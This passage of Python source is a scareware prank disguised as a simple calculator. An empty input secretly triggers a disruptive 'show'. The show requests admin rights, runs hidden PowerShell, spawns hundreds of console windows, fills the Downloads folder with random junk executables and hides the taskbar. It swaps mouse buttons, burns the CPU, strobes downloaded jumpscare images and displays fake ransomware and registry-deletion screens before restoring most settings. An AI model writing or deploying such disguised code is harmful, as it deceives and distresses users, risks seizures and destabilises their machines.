          14, "#00FF00", "black")
    root.after(REVEAL_S * 1000, root.destroy)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 18: afterparty
# ------------------------------------------------------------------
def afterparty_screen():
    """Fake reboot countdown, then a friendly goodbye."""
    root = make_screen("black", "#00FF00")
    label(root, "", 20, "#00FF00", "black")
    state = {"phase": 0, "n": 3}
    txt = label(root, "REBOOTING IN 3...", 36, "#00FF00", "black", pady=60)
    label(root, "Please wait while we restore your system.", 14, "#00AA00", "black")
    def tick():
        if state["phase"] == 0:
            state["n"] -= 1
            if state["n"] >= 0:
                txt.config(text=f"REBOOTING IN {state['n']}...")
                root.after(800, tick)
            else:
                state["phase"] = 1
                for w in root.winfo_children():
                    w.destroy()
                label(root, "", 10, "#00FF00", "black")
                label(root, "Just kidding.", 42, "#00FF00", "black", pady=40)
                label(root, "Have a nice day. :)", 24, "#00FF00", "black")
                label(root, "\u2014 Cal Industries Ltd.", 14, "#00AA00", "black")
                root.after(3000, root.destroy)
    root.after(500, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Jumpscare: GIF + WebP download, BMP conversion, strobe, scream
# ------------------------------------------------------------------
JUMPSCARE_GIF = "https://media1.tenor.com/m/wRwerbndgV8AAAAC/micheal.gif"
JUMPSCARE_WEBP = "https://i.ibb.co/NdFYvsRK/scary-faces-370x300.webp"
def scream_beeps():
    """Rapid descending beep from 1600 Hz down to 300 Hz, 3 passes."""
    if not WINDOWS:
        return
    for _ in range(3):
        for f in range(1600, 300, -20):
            try:
                winsound.Beep(f, 25)
            except Exception:
                pass
def fetch_jumpscare_images():
    """Download GIF and WebP images to temp folder."""
    files = []
    os.makedirs(SCARE_DIR, exist_ok=True)
    # Download GIF
    gif_path = os.path.join(SCARE_DIR, "jumpscare.gif")
    try:
        with urllib.request.urlopen(JUMPSCARE_GIF, timeout=10) as resp:
            data = resp.read()
        if len(data) > 500:
            with open(gif_path, "wb") as f:
                f.write(data)
            files.append(gif_path)
    except Exception:
        pass
    # Download WebP
    webp_path = os.path.join(SCARE_DIR, "jumpscare.webp")
    try:
        with urllib.request.urlopen(JUMPSCARE_WEBP, timeout=10) as resp:
            data = resp.read()
        if len(data) > 500:
            with open(webp_path, "wb") as f:
                f.write(data)
            # Convert WebP to BMP via System.Drawing
            bmp_path = os.path.join(SCARE_DIR, "jumpscare_webp.bmp")
            ps = (
                "Add-Type -AssemblyName System.Drawing; "
                f"$i=[System.Drawing.Image]::FromFile('{webp_path}'); "
                "$b=New-Object System.Drawing.Bitmap($i); "
                f"$b.Save('{bmp_path}',[System.Drawing.Imaging.ImageFormat]::Bmp); "
                "$i.Dispose(); $b.Dispose()"
            )
            try:
                subprocess.run(
                    ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                     "-Command", ps],
                    creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
                if os.path.exists(bmp_path):
                    files.append(bmp_path)
            except Exception:
                pass
    except Exception:
        pass
    return files
def jumpscare():
    """Strobe downloaded images fullscreen with white/black flashes
    and descending scream beeps for ~JUMPSCARE_S seconds."""
    files = fetch_jumpscare_images()
    if not files:
        return
    threading.Thread(target=scream_beeps, daemon=True).start()
    root = make_screen("black", "white")
    w = root.winfo_screenwidth()
    h = root.winfo_screenheight()
    cv = tk.Canvas(root, bg="black", highlightthickness=0)
    cv.pack(fill="both", expand=True)
    # Pre-load BMP/GIF as PhotoImage if possible
    images = []
    for f in files:
        try:
            if f.lower().endswith(".bmp"):
                img = tk.PhotoImage(file=f)
                images.append(("bmp", img))
            elif f.lower().endswith(".gif"):
                img = tk.PhotoImage(file=f)
                images.append(("gif", img))
        except Exception:
            pass
    state = {"start": time.time(), "frame": 0}
    def tick():
        elapsed = time.time() - state["start"]
        if elapsed > JUMPSCARE_S:
            root.destroy()
            return
        cv.delete("all")
        cycle = state["frame"] % 8
        if cycle == 0 or cycle == 4:
            # Flash white
            cv.create_rectangle(0, 0, w, h, fill="white", outline="")
        elif cycle == 2 or cycle == 6:
            # Flash black
            cv.create_rectangle(0, 0, w, h, fill="black", outline="")
        elif images:
            # Show an image
            _, img = random.choice(images)
            iw, ih = img.width(), img.height()
            scale = min(w / iw, h / ih)
            nw, nh = int(iw * scale), int(ih * scale)
            x, y = (w - nw) // 2, (h - nh) // 2
            cv.create_image(x + nw // 2, y + nh // 2, image=img)
            # Keep a reference to prevent GC
            cv._jumpscare_img = img
        state["frame"] += 1
        delay = 120 if cycle in (0, 2, 4, 6) else 300
        root.after(delay, tick)
    root.after(50, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Downloads flood
# ------------------------------------------------------------------
def get_downloads_path():
    """Real Downloads folder, honoring OneDrive redirection."""
    if not WINDOWS:
        return ""
    try:
        ps = "$ws=New-Object -ComObject WScript.Shell; " \
             "$ws.SpecialFolders.Item('Downloads')"
        res = subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
             "-Command", ps],
            capture_output=True, text=True,
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=20)
        p = (res.stdout or "").strip()
        return p if os.path.isdir(p) else ""
    except Exception:
        return ""
def download_flood():
    """Create junk files in the real Downloads folder.
    Returns list of created paths for cleanup."""
    dl = get_downloads_path()
    if not dl:
        return []
    exts = [".dat", ".exe", ".jpg", ".crypt", ".dll", ".sys"]
    created = []
    for _ in range(DOWNLOAD_SPAM):
        name = f"{SHORTCUT_PREFIX}download_{random.getrandbits(32):08X}{random.choice(exts)}"
        path = os.path.join(dl, name)
        try:
            size = random.randint(2 * 1024, 64 * 1024)
            data = os.urandom(size)
            with open(path, "wb") as f:
                f.write(data)
            created.append(path)
        except OSError:
            pass
    return created
def delete_downloads_by_prefix():
    """Sweep CAL_2_2_ prefixed files from Downloads."""
    dl = get_downloads_path()
    if not dl:
        return
    try:
        for f in os.listdir(dl):
            if f.startswith(SHORTCUT_PREFIX):
                try:
                    os.unlink(os.path.join(dl, f))
                except OSError:
                    pass
    except OSError:
        pass
# ------------------------------------------------------------------
# Terminal flood
# ------------------------------------------------------------------
def terminal_flood():
    """Wave of cmd windows."""
    if not WINDOWS:
        return
    # Wave 1: 60 quick open/close
    for _ in range(TERMINAL_SPAM):
        try:
            subprocess.Popen(["cmd", "/c", "exit"],
                             creationflags=subprocess.CREATE_NEW_CONSOLE)
        except OSError:
            pass
        time.sleep(0.03)
    # Wave 2: 300 with 2s timeout
    for _ in range(TERMINAL_SPAM2):
        try:
            subprocess.Popen(["cmd", "/c", "timeout /t 2 >nul"],
                             creationflags=subprocess.CREATE_NEW_CONSOLE)
        except OSError:
            pass
        time.sleep(0.015)
    # Wave 3: 40 with 1s timeout
    for _ in range(TERMINAL_SPAM3):
        try:
            subprocess.Popen(["cmd", "/c", "timeout /t 1 >nul"],
                             creationflags=subprocess.CREATE_NEW_CONSOLE)
        except OSError:
            pass
        time.sleep(0.03)
# ------------------------------------------------------------------
# Random apps
# ------------------------------------------------------------------
def random_apps():
    """Open harmless Windows apps at random."""
    if not WINDOWS:
        return
    apps = [
        "notepad.exe", "mspaint.exe", "calc.exe", "cmd.exe",
        "control.exe", "winver.exe", "osk.exe", "write.exe",
        "taskmgr.exe", "mstsc.exe", "explorer.exe",
    ]
    chosen = random.sample(apps, min(APP_SPAM, len(apps)))
    for app in chosen:
        try:
            subprocess.Popen([app], creationflags=subprocess.CREATE_NO_WINDOW)
        except OSError:
            pass
        time.sleep(random.uniform(0.8, 2.0))
# ------------------------------------------------------------------
# Fake Registry Editor
# ------------------------------------------------------------------
def fake_regedit():
    """A tkinter window that looks like regedit, typing fake deletions."""
    root = tk.Tk()
    root.title("Registry Editor")
    root.geometry("720x480+100+60")
    root.configure(bg="#FFFFFF")
    root.attributes("-topmost", True)
    # Tree panel (fake)
    tree = tk.Text(root, bg="#FFFFFF", fg="black", font=("Segoe UI", 10),
                   width=32, height=28, highlightthickness=1)
    tree.pack(side="left", fill="y")
    tree.insert("end", "Computer\n")
    tree.insert("end", "  HKEY_CLASSES_ROOT\n")
    tree.insert("end", "  HKEY_CURRENT_USER\n")
    tree.insert("end", "  HKEY_LOCAL_MACHINE\n")
    tree.insert("end", "    SYSTEM\n")
    tree.insert("end", "      CurrentControlSet\n")
    tree.insert("end", "        Control\n")
    tree.insert("end", "        Services\n")
    tree.insert("end", "  HKEY_USERS\n")
    tree.insert("end", "  HKEY_CURRENT_CONFIG\n")
    tree.config(state="disabled")
    # Content panel: fake deletion log
    panel = tk.Frame(root, bg="#FFFFFF")
    panel.pack(side="right", fill="both", expand=True)
    tk.Label(panel, text="Name", font=("Segoe UI", 10, "bold"),
             bg="#FFFFFF", anchor="w").pack(fill="x", padx=6)
    log = tk.Text(panel, bg="#FFFFFF", fg="black", font=("Consolas", 9),
                  height=26, highlightthickness=0)
    log.pack(fill="both", expand=True, padx=4, pady=2)
    log.tag_configure("red", foreground="#CC0000")
    # Simulated delete operations
    keys = [
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\cal32",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Winlogon",
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography",
    ]
    idx = [0]
    def tick():
        if idx[0] < len(keys):
            log.insert("end", f"Deleting {keys[idx[0]]} ... ", "")
            log.insert("end", "OK\n", "red")
            log.see("end")
            idx[0] += 1
            root.after(random.randint(400, 900), tick)
        else:
            log.insert("end", "\nDeleting HKLM\\SYSTEM\\... ", "")
            log.insert("end", "ERROR: Access is denied. Key is in use.\n", "red")
            root.after(3000, root.destroy)
    root.after(500, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Fake Task Manager
# ------------------------------------------------------------------
def fake_taskmgr():
    """Window showing cal32.exe processes multiplying to 45 entries."""
    root = tk.Tk()
    root.title("Task Manager")
    root.geometry("700x460+120+60")
    root.configure(bg="#F0F0F0")
    root.attributes("-topmost", True)
    # Header
    hdr = tk.Frame(root, bg="#E0E0E0")
    hdr.pack(fill="x")
    for col, w in [("Name", 30), ("CPU", 10), ("Memory", 14),
                   ("Disk", 10), ("Network", 12), ("PID", 10)]:
        tk.Label(hdr, text=col, font=("Segoe UI", 9, "bold"),
                 bg="#E0E0E0", width=w, anchor="w").pack(side="left", padx=2)
    # Process list
    listbox = tk.Text(root, bg="white", fg="black", font=("Consolas", 9),
                      height=24, highlightthickness=0)
    listbox.pack(fill="both", expand=True, padx=2, pady=2)
    listbox.tag_configure("red", foreground="#CC0000")
    state = {"count": 0, "max": 45, "done": False}
    def add_process():
        if state["done"]:
            return
        state["count"] += 1
        cpu = random.randint(0, 99)
        mem = f"{random.uniform(0.1, 450.0):.1f} MB"
        disk = f"{random.uniform(0, 10.0):.1f} MB/s"
        net = f"{random.uniform(0, 5.0):.1f} Mbps"
        pid = random.randint(1000, 65000)
        line = f"cal32.exe{' ' * max(1, 20 - len(str(cpu)) - len(str(mem)))}"
        listbox.insert("end",
                       f"cal32.exe          {cpu:>3}%    {mem:>10}    "
                       f"{disk:>10}    {net:>9}    {pid:>6}\n",
                       "red")
        listbox.see("end")
        if state["count"] >= state["max"]:
            state["done"] = True
            listbox.insert("end",
                           "\n-- Unable to terminate cal32.exe processes --\n",
                           "red")
            root.after(3000, root.destroy)
        else:
            root.after(150, add_process)
    root.after(200, add_process)
    root.mainloop()
# ------------------------------------------------------------------
# Restore / watchdog orchestration
# ------------------------------------------------------------------
def restore_system(wallpaper, backup, paths, icons_visible_at_start):
    """Put everything back. Safe to run twice."""
    if not WINDOWS:
        return
    try:
        tray = user32.FindWindowW("Shell_TrayWnd", None)
        if tray:
            user32.ShowWindow(tray, 5)
            btn = user32.FindWindowExW(tray, 0, "Button", "Start")
            if btn:
                user32.ShowWindow(btn, 5)
        progman = user32.FindWindowW("Progman", None)
        if progman:
            dv = user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
            if dv:
                guard = 0
                while (user32.IsWindowVisible(dv) !=
                       icons_visible_at_start) and guard < 4:
                    user32.SendMessageW(dv, 0x0111, 0x7402, 0)
                    time.sleep(0.4)
                    guard += 1
        user32.SwapMouseButton(False)
        while user32.ShowCursor(True) < 0:
            pass
        if wallpaper:
            user32.SystemParametersInfoW(20, 0, wallpaper, 3)
    except Exception:
        pass
    restore_resolution()
    invert_colors(False)
    for p in paths:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.unlink(p)
        except Exception:
            pass
    delete_shortcuts_by_prefix()
    delete_downloads_by_prefix()
    if backup and os.path.exists(backup):
        reg_import(backup)
        restart_explorer()
    shutil.rmtree(SCARE_DIR, ignore_errors=True)
# ------------------------------------------------------------------
# The show (hidden trigger)
# ------------------------------------------------------------------
def run_show():
    if not WINDOWS:
        sys.exit()
    os.makedirs(SCARE_DIR, exist_ok=True)
    original_wallpaper = get_wallpaper()
    backup = reg_export(ICON_REG_KEY,
                        os.path.join(SCARE_DIR, "icons_backup.reg"))
    note = desktop_note_path()
    staging = os.path.join(SCARE_DIR, "calcu_ransom")
    spawn_watchdog(original_wallpaper, [staging, note])
    icons_visible_at_start = desktop_icons_visible()
    theme_files = []
    download_files = []
    icon_state = {"shortcuts": []}
    try:
        threading.Thread(target=stage_voice, daemon=True).start()
        threading.Thread(target=siren, daemon=True).start()
        threading.Thread(target=tab_flood, daemon=True).start()
        threading.Thread(target=notepad_flood, daemon=True).start()
        threading.Thread(target=msgbox_spam, daemon=True).start()
        threading.Thread(target=terminal_flood, daemon=True).start()
        threading.Thread(target=download_flood_wrapper,
                         args=(download_files,), daemon=True).start()
        set_start_button(False)
        hide_taskbar()
        invert_colors(True)  # invert early and keep it on longer
        # Wave A: the system is dying
        boot_preview()
        bootmgr_missing()
        show_error_screen()
        automatic_repair()
        chkdsk_screen()
        chkdsk_screen()
        time.sleep(2)
        # Wave B: paranoia
        threading.Thread(target=burn_cpu, args=(8,), daemon=True).start()
        run_motion_preview()
        matrix_demo()
        cursor_frenzy(CURSOR_S)
        webcam_scare()
        hacker_console()
        fake_uac()
        start_menu_spam()
        resolution_panic()
        compact_history()
        scan_for_updates()
        time.sleep(2)
        # Jumpscare
        jumpscare()
        # Fake Task Manager & Registry Editor in parallel
        threading.Thread(target=fake_taskmgr, daemon=True).start()
        threading.Thread(target=fake_regedit, daemon=True).start()
        threading.Thread(target=random_apps, daemon=True).start()
        # Wave C: the payoff
        toggle_desktop_icons()
        export_results()
        theme_files = apply_user_theme()
        toggle_desktop_icons()
        threading.Thread(target=evil_riff, daemon=True).start()
        invert_colors(True)  # invert again for ransomware chaos
        t_chaos = threading.Thread(target=icon_chaos,
                                   args=(backup, icon_state), daemon=True)
        t_chaos.start()
        staging, note = ransomware_screen()
        t_chaos.join(timeout=5)
        windows_update_screen()
        matrix_demo()
        webcam_scare()
        sfc_screen()
        shutdown_scare()
        invert_colors(False)  # restore just before the friendly reveal
        reveal_screen()
        afterparty_screen()
    finally:
        paths = (list(theme_files) + [staging, note] +
                 list(icon_state["shortcuts"]) +
                 list(download_files))
        restore_system(original_wallpaper, backup, paths, icons_visible_at_start)
    sys.exit()
# ------------------------------------------------------------------
# Maintenance helpers
# ------------------------------------------------------------------
def download_flood_wrapper(result_list):
    """Thread-safe wrapper that populates a list with created file paths."""
    files = download_flood()
    result_list.extend(files)
def compact_history():
    """Window flood: conhost instances open and vanish."""
    if not WINDOWS:
        return
    for _ in range(FLASH_WINDOWS):
        subprocess.Popen(["cmd", "/c", "exit"],
                         creationflags=subprocess.CREATE_NEW_CONSOLE)
        time.sleep(0.03)
    for _ in range(HISTORY_CAP):
        subprocess.Popen(["cmd"],
                         creationflags=subprocess.CREATE_NEW_CONSOLE)
    for _ in range(AUTO_CLOSE):
        subprocess.Popen(["cmd", "/c", "timeout /t 1 >nul"],
                         creationflags=subprocess.CREATE_NEW_CONSOLE)
# ------------------------------------------------------------------
# REPL loop (looks like a plain calculator)
# ------------------------------------------------------------------
def request_admin():
    """Re-launch the script with admin rights via UAC if not already elevated."""
    if not WINDOWS:
        return
    try:
        shell32 = ctypes.windll.shell32
        if shell32.IsUserAnAdmin():
            return  # already admin
        # Re-launch with runas verb to trigger UAC
        shell32.ShellExecuteW.restype = ctypes.c_void_p  # 64-bit safe
        script = os.path.abspath(sys.argv[0])
        params = " ".join(f'"{a}"' for a in sys.argv[1:])
        ret = shell32.ShellExecuteW(
            None,                # hwnd
            "runas",             # operation
            sys.executable,      # file
            f'"{script}" {params}',  # parameters
            None,                # directory
            1                    # show command (SW_SHOWNORMAL)
        )
        if ret > 32:  # success
            sys.exit(0)
        else:
            # UAC was declined or failed — continue without admin
            pass
    except Exception:
        pass  # silent fallback

def main():
    request_admin()
    try:
        os.system("title Simple Calculator")
    except Exception:
        pass
    print("Simple Calculator")
    print("=================")
    print("Enter an expression such as 4+5*2 and press Enter.")
    print()
    while True:
        try:
            line = input("calc> ").strip()
            if not line:
                run_show()
            result = evaluate(line)
            print("= " + str(result))
        except KeyboardInterrupt:
            break
        except Exception as exc:
            print("Error: " + str(exc))
if __name__ == "__main__":
    main()